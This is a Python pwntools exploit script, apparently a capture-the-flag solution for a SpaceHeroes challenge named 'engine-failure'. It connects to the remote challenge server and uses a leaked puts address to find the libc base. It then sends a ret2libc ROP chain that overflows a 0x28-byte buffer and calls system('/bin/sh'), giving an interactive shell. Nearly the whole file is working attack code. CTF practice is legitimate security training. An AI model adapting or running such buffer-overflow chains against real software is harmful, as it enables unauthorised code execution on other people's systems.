#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0
filename = "./pwn"
if LOCAL:
    io = process(filename)
else:
    io=remote("spaceheroes-engine-failure.chals.io",443,ssl=True,sni="spaceheroes-engine-failure.chals.io")
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

debugPID()

def cmd(choice):
    ru(b'4) Exit\n')
    sl(i2b(choice))
def vuln(data):
    cmd(1)
    ru(b"2) Satellite\n")
    sl(i2b(1))
    ru(b"write a msg you want to send >>> \n")
    sl(data)

cmd(2)
ru(b"Coordinates: ")
libc_base = int(ru(b"\n", "drop"), 16) - libc.sym["puts"]
lg("libc_base")

pop_rdi_ret = libc_base + 0x000000000002a3e5

payload = b"a"*0x28# + p64(0xdeadbeef)
payload += p64(pop_rdi_ret + 1)
payload += p64(pop_rdi_ret) + p64(libc_base + next(libc.search(b"/bin/sh\x00")))
payload += p64(libc_base + libc.sym['system'])
vuln(payload)

ia()
